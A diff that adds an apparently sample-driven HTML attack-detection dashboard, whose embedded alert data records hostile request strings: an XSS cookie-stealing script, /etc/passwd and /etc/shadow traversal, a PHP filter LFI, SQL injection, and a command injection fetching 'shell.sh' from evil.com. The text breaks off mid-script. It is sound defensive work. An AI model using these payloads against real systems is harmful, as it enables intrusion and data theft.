@@ -1,0 +1,317 @@
+
+<h2 class="sr-only">Attack Detection & Log Analysis Dashboard — 90 alerts across 1427 log entries from 6 unique attacking IPs</h2>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+.dash{font-family:var(--font-mono,monospace);padding:0 0 2rem}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:1rem 0 1.25rem;border-bottom:0.5px solid var(--color-border-tertiary);margin-bottom:1.25rem}
+.brand{display:flex;align-items:center;gap:10px}
+.brand-icon{width:32px;height:32px;background:#E24B4A;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px}
+.brand-name{font-size:14px;font-weight:500;color:var(--color-text-primary)}
+.brand-sub{font-size:11px;color:var(--color-text-secondary)}
+.live-pill{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--color-text-secondary);background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:999px;padding:4px 10px}
+.live-dot{width:6px;height:6px;border-radius:50%;background:#639922;animation:blink 2s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+.kpi-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:1.25rem}
+.kpi{background:var(--color-background-secondary);border-radius:var(--border-radius-md);padding:1rem;position:relative;overflow:hidden}
+.kpi-val{font-size:26px;font-weight:500;color:var(--color-text-primary);line-height:1}
+.kpi-lbl{font-size:11px;color:var(--color-text-secondary);margin-top:4px;text-transform:uppercase;letter-spacing:.06em}
+.kpi-bar{position:absolute;top:0;left:0;right:0;height:2px}
+.kpi.crit .kpi-bar{background:#E24B4A}
+.kpi.high .kpi-bar{background:#BA7517}
+.kpi.med .kpi-bar{background:#639922}
+.kpi.tot .kpi-bar{background:#378ADD}
+.kpi.ips .kpi-bar{background:#7F77DD}
+.kpi.req .kpi-bar{background:#1D9E75}
+
+.row2{display:grid;grid-template-columns:2fr 1fr;gap:10px;margin-bottom:1.25rem}
+.row3{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:1.25rem}
+.panel{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:1rem 1.25rem}
+.panel-title{font-size:11px;font-weight:500;color:var(--color-text-secondary);text-transform:uppercase;letter-spacing:.08em;margin-bottom:1rem;display:flex;align-items:center;gap:6px}
+.panel-title-accent{width:3px;height:10px;border-radius:2px}
+
+.ip-row{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:0.5px solid var(--color-border-tertiary);font-size:12px;cursor:pointer}
+.ip-row:last-child{border-bottom:none}
+.ip-row:hover .ip-addr{color:#378ADD}
+.ip-addr{font-family:var(--font-mono);color:var(--color-text-primary);min-width:110px;font-size:11px;transition:color .15s}
+.ip-track{flex:1;height:3px;background:var(--color-background-secondary);border-radius:2px;overflow:hidden}
+.ip-fill{height:100%;border-radius:2px;background:#E24B4A;transition:width .8s ease}
+.ip-ct{color:var(--color-text-secondary);min-width:28px;text-align:right;font-size:11px}
+
+.badge{display:inline-block;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:500;letter-spacing:.04em}
+.badge-CRITICAL{background:#FCEBEB;color:#A32D2D;border:0.5px solid #F09595}
+.badge-HIGH{background:#FAEEDA;color:#854F0B;border:0.5px solid #FAC775}
+.badge-MEDIUM{background:#EAF3DE;color:#3B6D11;border:0.5px solid #C0DD97}
+.badge-LOW{background:#E6F1FB;color:#185FA5;border:0.5px solid #B5D4F4}
+
+.table-wrap{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:11px}
+thead th{font-size:10px;font-weight:500;color:var(--color-text-secondary);text-transform:uppercase;letter-spacing:.06em;padding:6px 8px;text-align:left;border-bottom:0.5px solid var(--color-border-tertiary);white-space:nowrap}
+tbody td{padding:7px 8px;border-bottom:0.5px solid var(--color-border-tertiary);color:var(--color-text-primary);vertical-align:middle}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:var(--color-background-secondary)}
+.url-cell{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:var(--font-mono);font-size:10px;color:var(--color-text-secondary)}
+.ip-mono{font-family:var(--font-mono);color:#185FA5;font-size:10px}
+.ts-cell{color:var(--color-text-secondary);font-size:10px;white-space:nowrap}
+
+.filters{display:flex;gap:8px;margin-bottom:1rem;flex-wrap:wrap}
+select,input{font-family:var(--font-mono);font-size:11px;padding:5px 8px;border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-md);background:var(--color-background-primary);color:var(--color-text-primary);outline:none}
+select:focus,input:focus{border-color:#378ADD}
+input{width:150px}
+
+.pagination{display:flex;align-items:center;justify-content:space-between;padding:10px 0 0;font-size:11px;color:var(--color-text-secondary)}
+.page-btns{display:flex;gap:6px}
+.page-btn{font-family:var(--font-mono);font-size:11px;padding:4px 10px;border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-md);background:var(--color-background-primary);color:var(--color-text-secondary);cursor:pointer;transition:all .15s}
+.page-btn:hover:not(:disabled){border-color:#378ADD;color:#185FA5}
+.page-btn:disabled{opacity:.4;cursor:default}
+
+.type-row{display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:0.5px solid var(--color-border-tertiary);font-size:11px}
+.type-row:last-child{border-bottom:none}
+.type-name{flex:1;color:var(--color-text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.type-track{width:80px;height:3px;background:var(--color-background-secondary);border-radius:2px;overflow:hidden}
+.type-fill{height:100%;border-radius:2px;background:#7F77DD}
+.type-ct{color:var(--color-text-secondary);min-width:24px;text-align:right}
+
+.chart-wrap{position:relative;width:100%;height:180px}
+.chart-wrap2{position:relative;width:100%;height:200px}
+
+@media(max-width:600px){.row2,.row3{grid-template-columns:1fr}.filters input{width:110px}}
+</style>
+
+<div class="dash">
+
+<div class="topbar">
+  <div class="brand">
+    <div class="brand-icon"><i class="ti ti-shield-check" aria-hidden="true"></i></div>
+    <div>
+      <div class="brand-name">Attack Detection Dashboard</div>
+      <div class="brand-sub">Log Analysis System — apache_sample.log</div>
+    </div>
+  </div>
+  <div class="live-pill">
+    <span class="live-dot"></span>
+    <span>1,427 entries analyzed</span>
+  </div>
+</div>
+
+<div class="kpi-grid" id="kpiGrid"></div>
+
+<div class="row2">
+  <div class="panel">
+    <div class="panel-title"><span class="panel-title-accent" style="background:#E24B4A"></span> Alert timeline</div>
+    <div class="chart-wrap"><canvas id="tlChart" role="img" aria-label="Alert count by hour over 3 hours, peaks at hour 08 with 52 alerts">07:00=4, 08:00=52, 09:00=34 alerts.</canvas></div>
+  </div>
+  <div class="panel">
+    <div class="panel-title"><span class="panel-title-accent" style="background:#E24B4A"></span> Top attacking IPs</div>
+    <div id="ipList"></div>
+  </div>
+</div>
+
+<div class="row3">
+  <div class="panel">
+    <div class="panel-title"><span class="panel-title-accent" style="background:#7F77DD"></span> Attack type breakdown</div>
+    <div class="chart-wrap2"><canvas id="typeChart" role="img" aria-label="Doughnut chart of attack types. Path Traversal dominates at 40.">Path Traversal 40, Malicious UA 14, Command Injection 12, Scanner 6, XSS 5, SQL Injection 4, others.</canvas></div>
+  </div>
+  <div class="panel">
+    <div class="panel-title"><span class="panel-title-accent" style="background:#1D9E75"></span> Attack type counts</div>
+    <div id="typeList"></div>
+  </div>
+</div>
+
+<div class="panel" style="margin-bottom:1.25rem">
+  <div class="panel-title"><span class="panel-title-accent" style="background:#378ADD"></span> Request volume &amp; status codes</div>
+  <div class="chart-wrap"><canvas id="reqChart" role="img" aria-label="Bar chart of requests by hour: 07=209, 08=1003, 09=215.">07:00=209 requests, 08:00=1003, 09:00=215.</canvas></div>
+</div>
+
+<div class="panel">
+  <div class="panel-title"><span class="panel-title-accent" style="background:#E24B4A"></span> Security alerts
+    <span style="margin-left:auto;font-size:10px;color:var(--color-text-secondary)" id="alertCount"></span>
+  </div>
+  <div class="filters">
+    <select id="fSev" onchange="render()">
+      <option value="">All severities</option>
+      <option value="CRITICAL">CRITICAL</option>
+      <option value="HIGH">HIGH</option>
+      <option value="MEDIUM">MEDIUM</option>
+      <option value="LOW">LOW</option>
+    </select>
+    <select id="fType" onchange="render()">
+      <option value="">All types</option>
+    </select>
+    <input id="fIP" placeholder="Filter by IP..." oninput="render()" />
+    <input id="fURL" placeholder="Filter by URL..." oninput="render()" />
+  </div>
+  <div class="table-wrap">
+    <table>
+      <thead><tr>
+        <th>Severity</th><th>Timestamp</th><th>IP</th><th>Attack type</th><th>Description</th><th>URL</th><th>Method</th>
+      </tr></thead>
+      <tbody id="alertBody"></tbody>
+    </table>
+  </div>
+  <div class="pagination">
+    <span id="pageInfo"></span>
+    <div class="page-btns">
+      <button class="page-btn" id="btnPrev" onclick="page(-1)">← Prev</button>
+      <button class="page-btn" id="btnNext" onclick="page(1)">Next →</button>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
+<script>
+const RAW = {"total_alerts":90,"total_entries":1427,"unique_ips":6,"severity_counts":{"CRITICAL":37,"HIGH":46,"MEDIUM":7},"attack_types":[{"type":"Path Traversal / LFI","count":40},{"type":"Malicious Tool UA","count":14},{"type":"Command Injection / RCE","count":12},{"type":"Known Scanner Tool","count":6},{"type":"Cross-Site Scripting (XSS)","count":5},{"type":"SQL Injection","count":4},{"type":"Brute Force (Login)","count":2},{"type":"Brute Force","count":2},{"type":"Vulnerability Scan","count":2},{"type":"Directory Brute Force","count":2}],"top_ips":[{"ip":"66.249.66.1","count":28},{"ip":"45.33.32.156","count":24},{"ip":"10.0.0.66","count":20},{"ip":"185.220.101.42","count":9},{"ip":"198.199.10.45","count":5},{"ip":"192.241.216.56","count":4}],"alert_timeline":[{"hour":"07:00","count":4},{"hour":"08:00","count":52},{"hour":"09:00","count":34}],"request_timeline":[{"hour":"07:00","count":209},{"hour":"08:00","count":1003},{"hour":"09:00","count":215}],"status_counts":{"200":1079,"301":42,"304":47,"404":186,"403":23,"401":50},"alerts":[{"attack_type":"Cross-Site Scripting (XSS)","ip":"45.33.32.156","severity":"CRITICAL","description":"Script tag detected in URL","timestamp":"2026-05-08T08:00:57+00:00","url":"/search?q=<script>alert(document.cookie)<\/script>","method":"GET","status_code":200},{"attack_type":"Cross-Site Scripting (XSS)","ip":"45.33.32.156","severity":"CRITICAL","description":"Script tag detected in URL","timestamp":"2026-05-08T08:01:06+00:00","url":"/search?q=<script>alert(document.cookie)<\/script>","method":"GET","status_code":200},{"attack_type":"Cross-Site Scripting (XSS)","ip":"45.33.32.156","severity":"CRITICAL","description":"Script tag detected in URL","timestamp":"2026-05-08T08:01:15+00:00","url":"/search?q=<script>alert(document.cookie)<\/script>","method":"GET","status_code":200},{"attack_type":"Cross-Site Scripting (XSS)","ip":"45.33.32.156","severity":"CRITICAL","description":"Script tag detected in URL","timestamp":"2026-05-08T08:01:24+00:00","url":"/search?q=<script>alert(document.cookie)<\/script>","method":"GET","status_code":200},{"attack_type":"Cross-Site Scripting (XSS)","ip":"45.33.32.156","severity":"CRITICAL","description":"Script tag detected in URL","timestamp":"2026-05-08T08:01:33+00:00","url":"/search?q=<script>alert(document.cookie)<\/script>","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:03+00:00","url":"/.git/config","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:05+00:00","url":"/.env","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:19+00:00","url":"/.htaccess","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:29+00:00","url":"/.git/config","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:31+00:00","url":"/.env","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:45+00:00","url":"/.htaccess","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:55+00:00","url":"/.git/config","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:31:57+00:00","url":"/.env","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:32:11+00:00","url":"/.htaccess","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:32:21+00:00","url":"/.git/config","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:32:23+00:00","url":"/.env","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:32:37+00:00","url":"/.htaccess","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:32:47+00:00","url":"/.git/config","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:32:49+00:00","url":"/.env","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"CRITICAL","description":"Config file disclosure detected","timestamp":"2026-05-08T08:33:03+00:00","url":"/.htaccess","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"45.33.32.156","severity":"CRITICAL","description":"Unix sensitive file detected","timestamp":"2026-05-08T09:06:02+00:00","url":"/exec?command=cat+/etc/passwd","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"45.33.32.156","severity":"CRITICAL","description":"Unix sensitive file detected","timestamp":"2026-05-08T09:06:22+00:00","url":"/exec?command=cat+/etc/passwd","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"45.33.32.156","severity":"CRITICAL","description":"Unix sensitive file detected","timestamp":"2026-05-08T09:06:42+00:00","url":"/exec?command=cat+/etc/passwd","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"45.33.32.156","severity":"CRITICAL","description":"Unix sensitive file detected","timestamp":"2026-05-08T09:07:02+00:00","url":"/exec?command=cat+/etc/passwd","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:05:57+00:00","url":"/api/run?cmd=;ls+-la","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:06:07+00:00","url":"/ping?host=127.0.0.1;wget+http://evil.com/shell.sh","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell expansion in URL","timestamp":"2026-05-08T09:06:12+00:00","url":"/api?action=$(id)","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:06:17+00:00","url":"/api/run?cmd=;ls+-la","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:06:27+00:00","url":"/ping?host=127.0.0.1;wget+http://evil.com/shell.sh","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell expansion in URL","timestamp":"2026-05-08T09:06:32+00:00","url":"/api?action=$(id)","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:06:37+00:00","url":"/api/run?cmd=;ls+-la","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:06:47+00:00","url":"/ping?host=127.0.0.1;wget+http://evil.com/shell.sh","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell expansion in URL","timestamp":"2026-05-08T09:06:52+00:00","url":"/api?action=$(id)","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:06:57+00:00","url":"/api/run?cmd=;ls+-la","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell command in URL","timestamp":"2026-05-08T09:07:07+00:00","url":"/ping?host=127.0.0.1;wget+http://evil.com/shell.sh","method":"GET","status_code":200},{"attack_type":"Command Injection / RCE","ip":"45.33.32.156","severity":"CRITICAL","description":"Shell expansion in URL","timestamp":"2026-05-08T09:07:12+00:00","url":"/api?action=$(id)","method":"GET","status_code":200},{"attack_type":"Brute Force (Login)","ip":"198.199.10.45","severity":"CRITICAL","description":"50 failed login attempts","timestamp":"2026-05-08T08:48:24+00:00","url":"/wp-login.php","method":null,"status_code":null},{"attack_type":"SQL Injection","ip":"185.220.101.42","severity":"HIGH","description":"Stacked query SQLi in request URL","timestamp":"2026-05-08T07:46:09+00:00","url":"/api?id=1;DROP","method":"GET","status_code":200},{"attack_type":"SQL Injection","ip":"185.220.101.42","severity":"HIGH","description":"Stacked query SQLi in request URL","timestamp":"2026-05-08T07:46:29+00:00","url":"/api?id=1;DROP","method":"GET","status_code":200},{"attack_type":"SQL Injection","ip":"185.220.101.42","severity":"HIGH","description":"Stacked query SQLi in request URL","timestamp":"2026-05-08T07:46:49+00:00","url":"/api?id=1;DROP","method":"GET","status_code":200},{"attack_type":"SQL Injection","ip":"185.220.101.42","severity":"HIGH","description":"Stacked query SQLi in request URL","timestamp":"2026-05-08T07:47:09+00:00","url":"/api?id=1;DROP","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:15:57+00:00","url":"/page?file=../../../../etc/passwd","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:01+00:00","url":"/include?path=../../../etc/shadow","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"PHP stream wrapper LFI detected","timestamp":"2026-05-08T08:16:05+00:00","url":"/?page=php://filter/convert.base64-encode/resource=index.php","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:09+00:00","url":"/download?file=../../.htaccess","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:13+00:00","url":"/page?file=../../../../etc/passwd","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:17+00:00","url":"/include?path=../../../etc/shadow","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"PHP stream wrapper LFI detected","timestamp":"2026-05-08T08:16:21+00:00","url":"/?page=php://filter/convert.base64-encode/resource=index.php","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:25+00:00","url":"/download?file=../../.htaccess","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:29+00:00","url":"/page?file=../../../../etc/passwd","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:33+00:00","url":"/include?path=../../../etc/shadow","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"PHP stream wrapper LFI detected","timestamp":"2026-05-08T08:16:37+00:00","url":"/?page=php://filter/convert.base64-encode/resource=index.php","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:41+00:00","url":"/download?file=../../.htaccess","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:45+00:00","url":"/page?file=../../../../etc/passwd","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:49+00:00","url":"/include?path=../../../etc/shadow","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"PHP stream wrapper LFI detected","timestamp":"2026-05-08T08:16:53+00:00","url":"/?page=php://filter/convert.base64-encode/resource=index.php","method":"GET","status_code":404},{"attack_type":"Path Traversal / LFI","ip":"10.0.0.66","severity":"HIGH","description":"Directory traversal detected","timestamp":"2026-05-08T08:16:57+00:00","url":"/download?file=../../.htaccess","method":"GET","status_code":403},{"attack_type":"Malicious Tool UA","ip":"66.249.66.1","severity":"HIGH","description":"Known attack tool: Nmap Scripting Engine","timestamp":"2026-05-08T08:30:57+00:00","url":"/wp-admin/","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"66.249.66.1","severity":"HIGH","description":"Known attack tool: Nikto/2.1.6","timestamp":"2026-05-08T08:30:59+00:00","url":"/wp-login.php","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"66.249.66.1","severity":"HIGH","description":"Known attack tool: sqlmap/1.7.8#stable","timestamp":"2026-05-08T08:31:01+00:00","url":"/phpmyadmin/","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"192.241.216.56","severity":"HIGH","description":"Known attack tool: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:10:57+00:00","url":"/probe0","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"45.33.32.156","severity":"HIGH","description":"Known attack tool: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:11:00+00:00","url":"/probe1","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"45.33.32.156","severity":"HIGH","description":"Known attack tool: Nmap Scripting Engine","timestamp":"2026-05-08T09:11:03+00:00","url":"/probe2","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"185.220.101.42","severity":"HIGH","description":"Known attack tool: Nikto/2.1.6","timestamp":"2026-05-08T09:11:06+00:00","url":"/probe3","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"10.0.0.66","severity":"HIGH","description":"Known attack tool: Nmap Scripting Engine","timestamp":"2026-05-08T09:11:12+00:00","url":"/probe5","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"185.220.101.42","severity":"HIGH","description":"Known attack tool: Nmap Scripting Engine","timestamp":"2026-05-08T09:11:15+00:00","url":"/probe6","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"10.0.0.66","severity":"HIGH","description":"Known attack tool: Nikto/2.1.6","timestamp":"2026-05-08T09:11:18+00:00","url":"/probe7","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"10.0.0.66","severity":"HIGH","description":"Known attack tool: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:11:30+00:00","url":"/probe11","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"185.220.101.42","severity":"HIGH","description":"Known attack tool: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:11:36+00:00","url":"/probe13","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"198.199.10.45","severity":"HIGH","description":"Known attack tool: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:11:45+00:00","url":"/probe16","method":null,"status_code":null},{"attack_type":"Malicious Tool UA","ip":"192.241.216.56","severity":"HIGH","description":"Known attack tool: Nikto/2.1.6","timestamp":"2026-05-08T09:11:51+00:00","url":"/probe18","method":null,"status_code":null},{"attack_type":"Brute Force","ip":"66.249.66.1","severity":"HIGH","description":"20 failed requests in 300s window","timestamp":"2026-05-08T08:33:05+00:00","url":null,"method":null,"status_code":null,"count":20},{"attack_type":"Brute Force","ip":"198.199.10.45","severity":"HIGH","description":"50 failed requests in 300s window","timestamp":"2026-05-08T08:48:24+00:00","url":null,"method":null,"status_code":null,"count":50},{"attack_type":"Brute Force (Login)","ip":"66.249.66.1","severity":"HIGH","description":"4 failed login attempts","timestamp":"2026-05-08T08:32:51+00:00","url":"/admin/","method":null,"status_code":null,"count":4},{"attack_type":"Vulnerability Scan","ip":"66.249.66.1","severity":"HIGH","description":"Probed 65 sensitive paths","timestamp":"2026-05-08T08:33:05+00:00","url":null,"method":null,"status_code":null,"count":65},{"attack_type":"Vulnerability Scan","ip":"198.199.10.45","severity":"HIGH","description":"Probed 50 sensitive paths","timestamp":"2026-05-08T08:48:24+00:00","url":null,"method":null,"status_code":null,"count":50},{"attack_type":"Directory Brute Force","ip":"185.220.101.42","severity":"HIGH","description":"127 HTTP 404s — directory enumeration","timestamp":"2026-05-08T09:17:55+00:00","url":null,"method":null,"status_code":null,"count":127},{"attack_type":"Known Scanner Tool","ip":"66.249.66.1","severity":"HIGH","description":"Scanner UA: Nmap Scripting Engine","timestamp":"2026-05-08T08:30:57+00:00","url":null,"method":null,"status_code":null,"count":65},{"attack_type":"Known Scanner Tool","ip":"192.241.216.56","severity":"HIGH","description":"Scanner UA: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:10:57+00:00","url":null,"method":null,"status_code":null,"count":5},{"attack_type":"Known Scanner Tool","ip":"45.33.32.156","severity":"HIGH","description":"Scanner UA: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:11:00+00:00","url":null,"method":null,"status_code":null,"count":4},{"attack_type":"Known Scanner Tool","ip":"185.220.101.42","severity":"HIGH","description":"Scanner UA: Nikto/2.1.6","timestamp":"2026-05-08T09:11:06+00:00","url":null,"method":null,"status_code":null,"count":10},{"attack_type":"Known Scanner Tool","ip":"10.0.0.66","severity":"HIGH","description":"Scanner UA: Nmap Scripting Engine","timestamp":"2026-05-08T09:11:12+00:00","url":null,"method":null,"status_code":null,"count":5},{"attack_type":"Known Scanner Tool","ip":"198.199.10.45","severity":"HIGH","description":"Scanner UA: sqlmap/1.7.8#stable","timestamp":"2026-05-08T09:11:45+00:00","url":null,"method":null,"status_code":null,"count":1},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"MEDIUM","description":"Backup file probe detected","timestamp":"2026-05-08T08:31:11+00:00","url":"/backup.zip","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"MEDIUM","description":"Backup file probe detected","timestamp":"2026-05-08T08:31:37+00:00","url":"/backup.zip","method":"GET","status_code":403},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"MEDIUM","description":"Backup file probe detected","timestamp":"2026-05-08T08:32:03+00:00","url":"/backup.zip","method":"GET","status_code":301},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"MEDIUM","description":"Backup file probe detected","timestamp":"2026-05-08T08:32:29+00:00","url":"/backup.zip","method":"GET","status_code":200},{"attack_type":"Path Traversal / LFI","ip":"66.249.66.1","severity":"MEDIUM","description":"Backup file probe detected","timestamp":"2026-05-08T08:32:55+00:00","url":"/backup.zip","method":"GET","status_code":200},{"attack_type":"DDoS / Request Flood","ip":"192.241.216.56","severity":"MEDIUM","description":"600 requests in 60s (~600/min)","timestamp":"2026-05-08T09:12:00+00:00","url":null,"method":null,"status_code":null,"count":600},{"attack_type":"Directory Brute Force","ip":"66.249.66.1","severity":"MEDIUM","description":"16 HTTP 404s — directory enumeration","timestamp":"2026-05-08T08:32:53+00:00","url":null,"method":null,"status_code":null,"count":16}]};
+
+let filtered = RAW.alerts;
+let curPage = 0;
+const PAGE = 20;
+
+function escHtml(s){ return s ? String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') : '' }
+function fmtTs(ts){ if(!ts) return '—'; const d=new Date(ts); return d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'})+' '+d.toLocaleDateString('en-GB',{day:'2-digit',month:'short'}); }
+
+function buildKPI(){
+  const s = RAW.severity_counts;
+  const defs=[
+    {cls:'tot',val:RAW.total_alerts,lbl:'Total alerts'},
+    {cls:'crit',val:s.CRITICAL||0,lbl:'Critical'},
+    {cls:'high',val:s.HIGH||0,lbl:'High'},
+    {cls:'med',val:s.MEDIUM||0,lbl:'Medium'},
+    {cls:'ips',val:RAW.unique_ips,lbl:'Attacking IPs'},
